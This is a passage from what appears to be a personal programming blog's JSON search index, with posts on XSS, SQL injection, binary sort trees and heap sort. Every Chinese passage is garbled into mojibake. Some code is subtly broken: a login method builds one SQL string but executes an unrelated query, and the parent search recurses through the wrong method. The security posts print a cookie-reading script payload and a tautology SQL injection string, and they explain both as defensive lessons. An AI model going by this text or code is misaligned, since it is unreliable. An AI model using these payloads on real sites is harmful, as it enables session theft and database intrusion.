çº§è¿åå•ä¸€èŒè´£åŸåˆ™ï¼›åªæœ‰ç±»ä¸­æ–¹æ³•æ•°é‡è¶³å¤Ÿå°‘ï¼Œå¯ä»¥åœ¨æ–¹æ³•çº§åˆ«ä¿æŒå•ä¸€åŸåˆ™ã€‚","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"XSSè·¨ç«™è„šæœ¬æ”»å‡»","slug":"XSSè·¨ç«™è„šæœ¬æ”»å‡»","date":"2020-05-31T04:58:53.000Z","updated":"2021-04-15T15:10:59.177Z","comments":true,"path":"XSSè·¨ç«™è„šæœ¬æ”»å‡»/","link":"","permalink":"https://blog.kayleh.top/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/","excerpt":"XSSè·¨ç«™è„šæœ¬æ”»å‡»","text":"XSSè·¨ç«™è„šæœ¬æ”»å‡» åœ¨åšç¤¾åŒºé¡¹ç›®çš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€ä¸ªXSSæ¼æ´ã€‚ img ä»€ä¹ˆæ˜¯XSSè·¨ç«™è„šæœ¬æ”»å‡»ï¼Ÿ XSSæ”»å‡»å…¨ç§°è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæ˜¯ä¸€ç§åœ¨webåº”ç”¨ä¸­çš„è®¡ç®—æœºå®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ¶æ„webç”¨æˆ·å°†ä»£ç æ¤å…¥åˆ°æä¾›ç»™å…¶å®ƒç”¨æˆ·ä½¿ç”¨çš„é¡µé¢ä¸­ã€‚ åœ¨ç‚¹å‡»å›å¤äºŒçº§è¯„è®ºæ—¶ï¼ŒJavaScriptè„šæœ¬ä¼šæ³¨å…¥é¡µé¢: ç¤ºä¾‹ï¼š ç„¶åå®¢æˆ·ç«¯å°±è°ƒç”¨è„šæœ¬alertå¯¼è‡´æ— é™å¼¹çª—ã€‚ è¿˜å¯ä»¥ä½¿ç”¨ &lt;script&gt;alert(document.cookie)&lt;/script&gt; è·å–é¡µé¢cookieï¼Œæ¯”å¦‚ç™»å½•çš„tokenã€‚ è§£å†³åŠæ³•ï¼š Jsoupä½¿ç”¨æ ‡ç­¾ç™½åå•çš„æœºåˆ¶ç”¨æ¥è¿›è¡Œé˜²æ­¢XSSæ”»å‡» å‚è€ƒï¼š [XSSè·¨ç«™è„šæœ¬æ”»å‡»]","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://blog.kayleh.top/tags/security/"}]},{"title":"SQLæ³¨å…¥å¼æ”»å‡»","slug":"SQLæ³¨å…¥å¼æ”»å‡»","date":"2020-05-30T05:13:52.000Z","updated":"2021-04-15T15:10:55.349Z","comments":true,"path":"SQLæ³¨å…¥å¼æ”»å‡»/","link":"","permalink":"https://blog.kayleh.top/SQL%E6%B3%A8%E5%85%A5%E5%BC%8F%E6%94%BB%E5%87%BB/","excerpt":"SQLæ³¨å…¥å¼æ”»å‡»","text":"SQLæ³¨å…¥å¼æ”»å‡» æ”»å‡»è€…æŠŠSQLå‘½ä»¤æ’å…¥åˆ°Webè¡¨å•çš„è¾“å…¥åŸŸæˆ–é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„SQLå‘½ä»¤ã€‚åœ¨æŸäº›è¡¨å•ä¸­ï¼Œç”¨æˆ·è¾“å…¥çš„å†…å®¹ç›´æ¥ç”¨æ¥æ„é€ ï¼ˆæˆ–è€…å½±å“ï¼‰åŠ¨æ€SQLå‘½ä»¤ï¼Œæˆ–ä½œä¸ºå­˜å‚¨è¿‡ç¨‹çš„è¾“å…¥å‚æ•°ï¼Œè¿™ç±»è¡¨å•ç‰¹åˆ«å®¹æ˜“å—åˆ°SQLæ³¨å…¥å¼æ”»å‡»ã€‚ å¸¸è§çš„SQLæ³¨å…¥å¼æ”»å‡»ä¸»è¦æ˜¯åˆ©ç”¨Statementçš„ç¼ºé™·ï¼ŒæœåŠ¡ç«¯éªŒè¯ï¼š @Override public void login(Account account) throws SQLException { String sql = &quot;insert into account values(null,&quot; + account.userName + &quot;,&quot; + account.password + &quot;)&quot;; try (Connection conn = DriverManager.getConnection(&quot;jdbc:mysql://127.0.0.1:3306/account?characterEncoding=UTF-8&quot;, &quot;root&quot;, &quot;password&quot;)) { try (Statement stmt = conn.createStatement()) { try (ResultSet rs = stmt.executeQuery(&quot;SELECT id, grade, name, gender FROM students WHERE gender=1&quot;)) { while (rs.next()) { int id = rs.getInt(1); String username = rs.getString(2); String password = rs.getString(3); } } } } } å®¢æˆ·ç«¯ &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u&quot; crossorigin=&quot;anonymous&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap-theme.min.css&quot; integrity=&quot;sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp&quot; crossorigin=&quot;anonymous&quot;&gt; &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/js/bootstrap.min.js&quot; integrity=&quot;sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt; &lt;div class=&quot;col-xs-8 col-sm-8 col-md-8 jumbotron&quot;&gt; &lt;form&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;exampleInputEmail1&quot;&gt;Username&lt;/label&gt; &lt;input type=&quot;email&quot; class=&quot;form-control&quot; id=&quot;exampleInputEmail1&quot; placeholder=&quot;Email&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;exampleInputPassword1&quot;&gt;Password&lt;/label&gt; &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;exampleInputPassword1&quot; placeholder=&quot;Password&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;exampleInputFile&quot;&gt;File input&lt;/label&gt; &lt;input type=&quot;file&quot; id=&quot;exampleInputFile&quot;&gt; &lt;p class=&quot;help-block&quot;&gt;Example block-level help text here.&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;checkbox&quot;&gt; &lt;label&gt; &lt;input type=&quot;checkbox&quot;&gt; Check me out &lt;/label&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; img å¦‚æœæ˜¯å®¢æˆ·ç«¯ç²¾å¿ƒæ„é€ çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ name = &quot;kayleh&#39; OR pass=&quot;, pass = &quot; OR pass=&#39;&quot; &#39; or 1= &#39; 1 å‘½ä»¤è¡Œæ°¸è¿œä¸ºçœŸï¼Œå¯¼è‡´æ³¨å…¥æˆåŠŸã€‚ æ‰€ä»¥ä½¿ç”¨JDBCæ—¶ï¼Œå°½é‡ä½¿ç”¨é€Ÿåº¦æ¯”è¾ƒå¿«ä¸”å®‰å…¨çš„ PreparedStatement ï¼ŒPreparedStatement ä½¿ç”¨çš„æ˜¯é¢„ç¼–è¯‘æœºåˆ¶ã€‚","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://blog.kayleh.top/tags/security/"}]},{"title":"binary sort tree","slug":"äºŒå‰æ’åºæ ‘","date":"2020-05-20T04:42:23.000Z","updated":"2021-04-11T17:11:28.572Z","comments":true,"path":"äºŒå‰æ’åºæ ‘/","link":"","permalink":"https://blog.kayleh.top/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/","excerpt":"äºŒå‰æ’åºæ ‘äºŒå‰æ’åºæ ‘ï¼šBST: (Binary Sort(Search) Tree), å¯¹äºäºŒå‰æ’åºæ ‘çš„ä»»ä½•ä¸€ä¸ªéå¶å­èŠ‚ç‚¹ï¼Œè¦æ±‚å·¦å­èŠ‚ç‚¹çš„å€¼æ¯”å½“å‰èŠ‚ç‚¹çš„å€¼å°ï¼Œå³å­èŠ‚ç‚¹çš„å€¼æ¯”å½“å‰èŠ‚ç‚¹çš„å€¼å¤§ã€‚ å¦‚æœæœ‰ç›¸åŒçš„å€¼ï¼Œå¯ä»¥å°†è¯¥èŠ‚ç‚¹æ”¾åœ¨å·¦å­èŠ‚ç‚¹æˆ–å³å­èŠ‚ç‚¹","text":"äºŒå‰æ’åºæ ‘äºŒå‰æ’åºæ ‘ï¼šBST: (Binary Sort(Search) Tree), å¯¹äºäºŒå‰æ’åºæ ‘çš„ä»»ä½•ä¸€ä¸ªéå¶å­èŠ‚ç‚¹ï¼Œè¦æ±‚å·¦å­èŠ‚ç‚¹çš„å€¼æ¯”å½“å‰èŠ‚ç‚¹çš„å€¼å°ï¼Œå³å­èŠ‚ç‚¹çš„å€¼æ¯”å½“å‰èŠ‚ç‚¹çš„å€¼å¤§ã€‚ å¦‚æœæœ‰ç›¸åŒçš„å€¼ï¼Œå¯ä»¥å°†è¯¥èŠ‚ç‚¹æ”¾åœ¨å·¦å­èŠ‚ç‚¹æˆ–å³å­èŠ‚ç‚¹ â€‹ æ•°æ® (7, 3, 10, 12, 5, 1, 9) ï¼Œå¯¹åº”çš„äºŒå‰æ’åºæ ‘ä¸º â€‹ â€‹ â†“ â€‹ äºŒå‰æ’åºæ ‘çš„åˆ é™¤æƒ…å†µæ¯”è¾ƒå¤æ‚ï¼Œæœ‰ä¸‹é¢ä¸‰ç§æƒ…å†µéœ€è¦è€ƒè™‘ 1)åˆ é™¤å¶å­èŠ‚ç‚¹ (æ¯”å¦‚ï¼š2, 5, 9, 12) 2)åˆ é™¤åªæœ‰ä¸€é¢—å­æ ‘çš„èŠ‚ç‚¹ (æ¯”å¦‚ï¼š1) 3)åˆ é™¤æœ‰ä¸¤é¢—å­æ ‘çš„èŠ‚ç‚¹. (æ¯”å¦‚ï¼š7, 3ï¼Œ10 ) ç¬¬ä¸€ç§æƒ…å†µ: åˆ é™¤å¶å­èŠ‚ç‚¹ (æ¯”å¦‚ï¼š2, 5, 9, 12) æ€è·¯ (1) éœ€æ±‚å…ˆå»æ‰¾åˆ°è¦åˆ é™¤çš„ç»“ç‚¹ targetNode (2) æ‰¾åˆ°targetNode çš„ çˆ¶ç»“ç‚¹ parent (3) ç¡®å®š targetNode æ˜¯ parentçš„å·¦å­ç»“ç‚¹ è¿˜æ˜¯å³å­ç»“ç‚¹ (4) æ ¹æ®å‰é¢çš„æƒ…å†µæ¥å¯¹åº”åˆ é™¤ å·¦å­ç»“ç‚¹ parent.left = null å³å­ç»“ç‚¹ parent.right = null; ç¬¬äºŒç§æƒ…å†µ: åˆ é™¤åªæœ‰ä¸€é¢—å­æ ‘çš„èŠ‚ç‚¹ æ¯”å¦‚ 1 æ€è·¯ (1) éœ€æ±‚å…ˆå»æ‰¾åˆ°è¦åˆ é™¤çš„ç»“ç‚¹ targetNode (2) æ‰¾åˆ°targetNode çš„ çˆ¶ç»“ç‚¹ parent (3) ç¡®å®štargetNode çš„å­ç»“ç‚¹æ˜¯å·¦å­ç»“ç‚¹è¿˜æ˜¯å³å­ç»“ç‚¹ (4) targetNode æ˜¯ parent çš„å·¦å­ç»“ç‚¹è¿˜æ˜¯å³å­ç»“ç‚¹ (5) å¦‚æœtargetNode æœ‰å·¦å­ç»“ç‚¹ 5. 1 å¦‚æœ targetNode æ˜¯ parent çš„å·¦å­ç»“ç‚¹ parent.left = targetNode.left; 5.2 å¦‚æœ targetNode æ˜¯ parent çš„å³å­ç»“ç‚¹ parent.right = targetNode.left; (6) å¦‚æœtargetNode æœ‰å³å­ç»“ç‚¹ 6.1 å¦‚æœ targetNode æ˜¯ parent çš„å·¦å­ç»“ç‚¹ parent.left = targetNode.right; 6.2 å¦‚æœ targetNode æ˜¯ parent çš„å³å­ç»“ç‚¹ parent.right = targetNode.right æƒ…å†µä¸‰ ï¼š åˆ é™¤æœ‰ä¸¤é¢—å­æ ‘çš„èŠ‚ç‚¹. (æ¯”å¦‚ï¼š7, 3ï¼Œ10 ) æ€è·¯ (1) éœ€æ±‚å…ˆå»æ‰¾åˆ°è¦åˆ é™¤çš„ç»“ç‚¹ targetNode (2) æ‰¾åˆ°targetNode çš„ çˆ¶ç»“ç‚¹ parent (3) ä»targetNode çš„å³å­æ ‘æ‰¾åˆ°æœ€å°çš„ç»“ç‚¹ (4) ç”¨ä¸€ä¸ªä¸´æ—¶å˜é‡ï¼Œå°† æœ€å°ç»“ç‚¹çš„å€¼ä¿å­˜ temp = 11 (5) åˆ é™¤è¯¥æœ€å°ç»“ç‚¹ (6) targetNode.value = temp ä»£ç å®ç°package binarysorttree; /** * @Author: Wizard * @Date: 2020/5/20 11:42 */ public class BinarySortTreeDemo { public static void main(String[] args) { // int[] arr = {7, 3, 10, 12, 5, 1, 9}; int[] arr = {7,3}; BinarySortTree binarySortTree = new BinarySortTree(); for (int i = 0; i &lt; arr.length; i++) { binarySortTree.add(new Node(arr[i])); } binarySortTree.infixOrder(); binarySortTree.delNode(7); System.out.println(&quot;åˆ é™¤å&quot;); binarySortTree.infixOrder(); } } //åˆ›å»ºäºŒå‰æ’åºæ ‘ class BinarySortTree { private Node root; //æŸ¥æ‰¾è¦åˆ é™¤çš„ç»“ç‚¹ public Node search(int value) { if (root == null) { return null; } else { return root.search(value); } } //æŸ¥æ‰¾çˆ¶ç»“ç‚¹ public Node searchParent(int value) { if (root == null) { return null; } else { return root.searchParent(value); } } /** * å³è¾¹æ‰¾æœ€å°çš„ * å·¦è¾¹æ‰¾æœ€å¤§çš„ * * è¿”å›çš„ ä»¥nodeä¸ºæ ¹ç»“ç‚¹çš„æœ€å°ç»“ç‚¹çš„å€¼ * åˆ é™¤ä»¥nodeä¸ºæ ¹ç»“ç‚¹çš„æœ€å°ç»“ç‚¹çš„å€¼ * * @param node ä¼ å…¥çš„ç»“ç‚¹ï¼ˆå½“åšäºŒå‰æ’åºæ ‘çš„æ ¹ç»“ç‚¹ï¼‰ * @return è¿”å›çš„ ä»¥nodeä¸ºæ ¹ç»“ç‚¹çš„æœ€å°ç»“ç‚¹çš„å€¼ */ public int delRightTreeMin(Node node) { Node target = node; //å¾ªç¯çš„æŸ¥æ‰¾å·¦å­èŠ‚ç‚¹ï¼Œå°±ä¼šæ‰¾åˆ°æœ€å°å€¼ while (target.left != null) { target = target.left; } //è¿™æ˜¯targetå°±æŒ‡å‘äº†æœ€å°ç»“ç‚¹ //åˆ é™¤æœ€å°ç»“ç‚¹ delNode(target.value); return target.value; } //åˆ é™¤ç»“ç‚¹ public void delNode(int value) { if (root == null) { return; } else { //éœ€è¦å…ˆå»æ‰¾åˆ°è¦åˆ é™¤çš„ç»“ç‚¹ targetNode Node targetNode = search(value); //å¦‚æœæ²¡æœ‰æ‰¾åˆ°è¦åˆ é™¤çš„ç»“ç‚¹ if (targetNode == null) { return; } //å¦‚æœå‘ç°targetNodeæ²¡æœ‰çˆ¶ç»“ç‚¹ï¼ˆå°±æ˜¯æ ¹ç»“ç‚¹ï¼‰(åªæœ‰ä¸€ä¸ªç»“ç‚¹) if (root.left == null &amp;&amp; root.right == null) { root = null; return; } //å»æ‰¾åˆ°targetNodeçš„çˆ¶ç»“ç‚¹ Node parent = searchParent(value); //å¦‚æœè¦åˆ é™¤çš„ç»“ç‚¹æ˜¯å¶å­ç»“ç‚¹ if (targetNode.left == null &amp;&amp; targetNode.right == null) { //åˆ¤æ–­targetNodeæ˜¯çˆ¶ç»“ç‚¹çš„å·¦å­ç»“ç‚¹è¿˜æ˜¯å³å­ç»“ç‚¹ if (parent.left != null &amp;&amp; parent.left.value == value) { parent.left = null; } else if (parent.right != null &amp;&amp; parent.right.value == value) { parent.right = null; } } else if (targetNode.left != null &amp;&amp; targetNode.right != null) { //åˆ é™¤æœ‰ä¸¤é¢—å­æ ‘çš„ç»“ç‚¹ int min = delRightTreeMin(targetNode.right);//targetå³è¾¹æœ€å°çš„å€¼ targetNode.value = min; } else { //åˆ é™¤åªæœ‰ä¸€é¢—å­æ ‘çš„ç»“ç‚¹ //å¦‚æœè¦åˆ é™¤çš„ç»“ç‚¹æœ‰å·¦å­ç»“ç‚¹ // System.out.println(parent); if (parent!=null) { if (targetNode.left != null) { //å¦‚æœtargetNodeæ˜¯parentçš„å·¦å­ç»“ç‚¹ if (parent.left.value == value) { parent.left = targetNode.left; } else { //å¦‚æœtargetNodeæ˜¯parentçš„å³å­ç»“ç‚¹ parent.right = targetNode.left; } } else { //å¦‚æœè¦åˆ é™¤çš„ç»“ç‚¹æœ‰å³å­ç»“ç‚¹ if (parent.left.value == value) { //å¦‚æœtargetNodeæ˜¯parentçš„å·¦å­ç»“ç‚¹ parent.left = targetNode.right; } else { //å¦‚æœtargetNodeæ˜¯parentçš„å³å­ç»“ç‚¹ parent.right = targetNode.right; } } }else { if (root.left!=null){ root = root.left; }else { root = root.right; } } } } } //æ·»åŠ ç»“ç‚¹çš„æ–¹æ³• public void add(Node node) { if (root == null) { root = node; } else { root.add(node); } } //ä¸­åºéå†æ–¹æ³• public void infixOrder() { if (root != null) { root.infixOrder(); } else { System.out.println(&quot;å½“å‰äºŒå‰æ’åºæ ‘ä¸ºç©ºï¼Œä¸èƒ½éå†&quot;); } } } //åˆ›å»ºNodeç»“ç‚¹ class Node { int value; Node left; Node right; @Override public String toString() { return &quot;Node{&quot; + &quot;value=&quot; + value + &#39;}&#39;; } /** * æŸ¥æ‰¾è¦åˆ é™¤çš„ç»“ç‚¹ * * @param value å¸Œæœ›åˆ é™¤çš„ç»“ç‚¹çš„å€¼ * @return å¦‚æœæ‰¾åˆ°è¿”å›è¯¥ç»“ç‚¹ï¼Œå¦åˆ™è¿”å›null */ public Node search(int value) { if (value == this.value) { //æ‰¾åˆ°å°±æ˜¯è¯¥ç»“ç‚¹ return this; } else if (value &lt; this.value) { //å¦‚æœæŸ¥æ‰¾çš„å€¼å°äºå½“å‰ç»“ç‚¹ï¼Œå‘å·¦å­æ ‘é€’å½’æŸ¥æ‰¾ //å¦‚æœå·¦å­ç»“ç‚¹ä¸ºç©º if (this.left == null) { return null; } return this.left.search(value); } else { //å¦‚æœæŸ¥æ‰¾çš„å€¼ä¸å°äºå½“å‰ç»“ç‚¹ï¼Œå‘å³å­æ ‘é€’å½’æŸ¥æ‰¾ if (this.right == null) { return null; } return this.right.search(value); } } /** * æŸ¥æ‰¾è¦åˆ é™¤ç»“ç‚¹çš„çˆ¶ç»“ç‚¹ * * @param value è¦æ‰¾åˆ°ç»“ç‚¹çš„å€¼ * @return è¿”å›çš„æ˜¯è¦åˆ é™¤çš„ç»“ç‚¹çš„çˆ¶ç»“ç‚¹ï¼Œå¦‚æœæ²¡æœ‰å°±è¿”å›null */ public Node searchParent(int value) { //å¦‚æœå½“å‰ç»“ç‚¹å°±æ˜¯è¦åˆ é™¤çš„ç»“ç‚¹çš„çˆ¶ç»“ç‚¹ï¼Œå°±è¿”å› if ((this.left != null &amp;&amp; this.left.value == value) || (this.right != null &amp;&amp; this.right.value == value)) { return this; } else { //å¦‚æœæŸ¥æ‰¾çš„å€¼å°äºå½“å‰ç»“ç‚¹çš„å€¼ï¼Œå¹¶ä¸”å½“å‰ç»“ç‚¹çš„å·¦å­ç»“ç‚¹ä¸ä¸ºç©º if (value &lt; this.value &amp;&amp; this.left != null) { return this.left.search(value);//å‘å·¦å­æ ‘é€’å½’æŸ¥æ‰¾ } else if (value &gt;= this.value &amp;&amp; this.right != null) { return this.right.search(value);//å‘å³å­æ ‘é€’å½’æŸ¥æ‰¾ } else { return null;//æ²¡æœ‰æ‰¾åˆ°çˆ¶ç»“ç‚¹ } } } public Node(int value) { this.value = value; } //æ·»åŠ ç»“ç‚¹çš„æ–¹å¼ //é€’å½’çš„å½¢å¼æ·»åŠ ç»“ç‚¹ï¼Œéœ€è¦æ»¡è¶³äºŒå‰æ’åºæ ‘çš„è¦æ±‚ public void add(Node node) { if (node == null) { return; } //åˆ¤æ–­ä¼ å…¥çš„ç»“ç‚¹çš„å€¼ï¼Œå’Œå½“å‰å­æ ‘çš„æ ¹ç»“ç‚¹çš„å€¼çš„å…³ç³» if (node.value &lt; this.value) { //å¦‚æœå½“å‰ç»“ç‚¹çš„å·¦å­ç»“ç‚¹ä¸ºnull if (this.left == null) { //æŠŠç»“ç‚¹æŒ‚åœ¨å·¦å­ç»“ç‚¹ this.left = node; } else { //å¦‚æœå·¦å­ç»“ç‚¹ä¸ä¸ºç©ºï¼Œå‘å·¦å­æ ‘é€’å½’æ·»åŠ  this.left.add(node); } } else { //å¦‚æœ æ·»åŠ çš„ç»“ç‚¹çš„å€¼ å¤§äº æ ¹ç»“ç‚¹çš„å€¼ if (this.right == null) { this.right = node; } else { this.right.add(node); } } } //ä¸­åºéå† public void infixOrder() { if (this.left != null) { this.left.infixOrder(); } System.out.println(this); if (this.right != null) { this.right.infixOrder(); } } }","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"heap-sort","slug":"å †æ’åº","date":"2020-05-18T04:40:11.000Z","updated":"2021-04-11T17:11:28.827Z","comments":true,"path":"å †æ’åº/","link":"","permalink":"https://blog.kayleh.top/%E5%A0%86%E6%8E%92%E5%BA%8F/","excerpt":"å †æ’åº","text":"å †æ’åº 1.å †æ’åºæ˜¯åˆ©ç”¨å †è¿™ç§æ•°æ®ç»“æ„è€Œè®¾è®¡çš„ä¸€ç§ç®—æ³•ï¼Œå †æ’åºæ˜¯ä¸€ç§é€‰æ‹©æ’åºï¼Œå®ƒçš„æœ€åï¼Œæœ€å¥½ï¼Œå¹³å‡å¤æ‚åº¦å‡ä¸ºO(nlogn)ï¼Œå®ƒä¹Ÿæ˜¯ä¸ç¨³å®šçš„æ’åºã€‚ 2.å †æ˜¯å…·æœ‰ä»¥ä¸‹æ€§è´¨çš„å®Œå…¨äºŒå‰æ ‘ï¼šæ¯ä¸ªç»“ç‚¹çš„å€¼éƒ½å¤§äºæˆ–ç­‰äºå…¶å·¦å³å­©å­ç»“ç‚¹çš„å€¼ï¼Œç§°ä¸ºå¤§é¡¶å †ã€‚æ²¡æœ‰è¦æ±‚ç»“ç‚¹çš„å·¦å­©å­çš„å€¼å’Œå³å­©å­çš„å€¼å¤§å°å…³ç³»ã€‚ 3.æ¯ä¸ªç»“ç‚¹çš„å€¼éƒ½å°äºæˆ–ç­‰äºå…¶å·¦å³å­©å­ç»“ç‚¹çš„å€¼ï¼Œç§°ä¸ºå°é¡¶å † package sort; import java.util.Arrays; /** * @Author: Wizard * @Date: 2020/5/18 21:16 */ public class heapSort { public static void main(String[] args) { //è¦æ±‚å°†æ•°ç»„è¿›è¡Œå‡åºæ’åˆ— } //ç¼–å†™ä¸€ä¸ªå †æ’åºçš„æ–¹æ³• public static void heapSort(int arr[]) { int temp = 0; System.out.println(&quot;å †æ’åºï¼&quot;); // i ç¬¬ä¸€ä¸ªéå¶å­ç»“ç‚¹ // è¿™é‡Œçš„ç›®çš„æ˜¯æŠŠæœ€å¤§çš„æ•°äº¤æ¢åˆ°å †é¡¶ï¼Œæˆä¸ºä¸€ä¸ªå¤§é¡¶å †ç»“æ„ for (int i = arr.length / 2 - 1; i &gt;= 0; i--) { adjustHeap(arr, i, arr.length); System.out.println(Arrays.toString(arr)); } /* å°†å †é¡¶å…ƒç´ äºæœ«å°¾å…ƒç´ äº¤æ¢ï¼Œå°†æœ€å¤§å…ƒç´ â€œæ²‰â€åˆ°æ•°ç»„æœ«ç«¯ é‡æ–°è°ƒæ•´ç»“æ„ï¼Œä½¿å…¶æ»¡è¶³å †å®šä¹‰ï¼Œç„¶åç»§ç»­äº¤æ¢å †é¡¶å…ƒç´ ä¸å½“å‰æœ«å°¾å…ƒç´ ï¼Œåå¤æ‰§è¡Œè°ƒæ•´+äº¤æ¢æ­¥éª¤ï¼Œç›´åˆ°æ•´ä¸ªåºåˆ—æœ‰åº */ //ä¸€å…±5ä¸ªæ•°ï¼Œè°ƒæ•´4ä¸ªæ•°å°±å¯ä»¥äº† for (int j = arr.length - 1; j &gt; 0; j--) { temp = arr[j]; arr[j] = arr[0];//arr[0] æ˜¯ä¸Šé¢è°ƒæ•´åçš„æœ€å¤§å€¼ arr[0] = temp; adjustHeap(arr, 0, j); System.out.println(&quot;ç¬¬&quot;+(arr.length-j)+&quot;æ¬¡æ²‰&quot;+Arrays.toString(arr)); } System.out.println(Arrays.toString(arr)); //æ¯æ¬¡éå†æŠŠæœ€å¤§çš„æ•°ï¼ˆåœ¨è°ƒæ•´ä¹‹åçš„çˆ¶èŠ‚ç‚¹ï¼Œç¬¬ä¸€ä½ï¼‰æ²‰åˆ°æ•°ç»„çš„æœ«ç«¯ //ç„¶å å†è°ƒæ•´ æŠŠæœ€å¤§çš„æ•°äº¤æ¢åˆ°å †é¡¶ï¼ˆadjustHeapï¼‰ï¼Œå†æ²‰åˆ°æ•°ç»„çš„æœ«ç«¯çš„ä½ç½®-1ï¼Œéšç€jçš„é€’å‡ï¼Œæœ«å°¾çš„å‰å‡ ä¸ªæ•°å­—é€æ¸ç¡®å®šï¼ˆè°ƒæ•´çš„èŒƒå›´å‡å°‘ï¼‰ } //å°†ä¸€ä¸ªæ•°ç»„(äºŒå‰æ ‘),è°ƒæ•´ä¸ºä¸€ä¸ªå¤§é¡¶å † /** * åŠŸèƒ½ï¼šå®Œæˆå°†ä»¥ i å¯¹åº”çš„éå¶å­ç»“ç‚¹çš„æ ‘è°ƒæ•´ä¸ºå¤§é¡¶å † * int arr[] = {4,6,8,5,9}; â†’ i = 1 â†’ adjustHeap â†’ å¾—åˆ°{4,9,8,5,6} * å†æ¬¡è°ƒç”¨adjustHeap ä¼ å…¥çš„æ˜¯ i= 0 â†’ å¾—åˆ°{9,6,8,5,4} * * @param arr å¾…è°ƒæ•´çš„æ•°ç»„ * @param i è¡¨ç¤ºéå¶å­ç»“ç‚¹åœ¨æ•°ç»„ä¸­çš„ç´¢å¼• * @param lenght è¡¨ç¤ºå½’å¤šå°‘ä¸ªå…ƒç´ ç»§ç»­è°ƒæ•´ï¼Œlength æ˜¯åœ¨é€æ¸çš„å‡å°‘ */ public static void adjustHeap(int arr[], int i, int lenght) { int temp = arr[i];//å–å‡ºå½“å‰å…ƒç´ çš„å€¼ï¼Œä¿å­˜åœ¨ä¸´æ—¶å˜é‡ï¼Œ ä»¥ i ä½œä¸ºçˆ¶èŠ‚ç‚¹ï¼ˆå±€éƒ¨ï¼‰ //å¼€å§‹è°ƒæ•´ //k = iå¯¹åº”çš„å·¦å­èŠ‚ç‚¹ for (int k = 2 * i + 1; k &lt; lenght; k = 2 * i + 1) { if (k + 1 &lt; lenght &amp;&amp; arr[k] &lt; arr[k + 1]) { //è¯´æ˜å·¦å­èŠ‚ç‚¹çš„å€¼å°äºå³å­èŠ‚ç‚¹ k++;//è®© k æŒ‡å‘å³å­èŠ‚ç‚¹ } if (arr[k] &gt; temp) { //å¦‚æœå­èŠ‚ç‚¹å¤§äºçˆ¶èŠ‚ç‚¹ //å°±æŠŠè¾ƒå¤§çš„å€¼èµ‹å€¼ç»™å½“å‰èŠ‚ç‚¹ arr[i] = arr[k]; // ! iæŒ‡å‘k ç»§ç»­å¾ªç¯æ¯”è¾ƒ i = k; //æŠŠiï¼ˆçˆ¶èŠ‚ç‚¹ï¼‰æŒ‡å‘ kï¼ˆå­èŠ‚ç‚¹ï¼‰ã€‚ä½œä¸ºçˆ¶èŠ‚ç‚¹ç»§ç»­å¾ªç¯ } else { //å¦‚æœå­èŠ‚ç‚¹å°äºçˆ¶èŠ‚ç‚¹ //å †æ’åºæ˜¯ä»å·¦è‡³å³ï¼Œä»ä¸‹è‡³ä¸Š break; } } //å½“forå¾ªç¯ç»“æŸåï¼Œå·²ç»å°†ä»¥iä¸ºçˆ¶èŠ‚ç‚¹çš„æ ‘çš„æœ€å¤§å€¼ï¼Œæ”¾åœ¨äº†æœ€é¡¶ï¼ˆå±€éƒ¨ï¼‰ arr[i] = temp;//å°†tempå€¼æ”¾åˆ°è°ƒæ•´åçš„ä½ç½® //adjustHeap()æ–¹æ³•ä¸­ä¾ç„¶è¦å¾ªç¯, æ˜¯å› ä¸ºæœ€ååœ¨å †æ’åºçš„æ—¶å€™æ˜¯ä»ä¸‹åˆ°ä¸Šçš„, æ’åºä¸­å‘ä¸Šè°ƒç”¨è¿™ä¸ªæ–¹æ³•æ—¶ , iä¹Ÿä¼šå¾€ä¸Šèµ°, è¿™æ—¶å†æ¬¡è°ƒç”¨adjustHeapt //è¿™æ—¶å†æ¬¡è°ƒç”¨adjustHeapæ–¹æ³•æ—¶, iå°±ä¸æ˜¯æœ€åä¸€ä¸ªéå¶å­èŠ‚ç‚¹äº†, ä¼šç ´ååŸå…ˆå·²ç»æ’åºå¥½çš„å¤§é¡¶å †, æ‰€ä»¥éœ€è¦å¾ªç¯å¾€ä¸‹å°†è¢«ç ´åçš„å¤§é¡¶å †é‡æ–°å»ºç«‹èµ·æ¥ } }","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"7 sorting 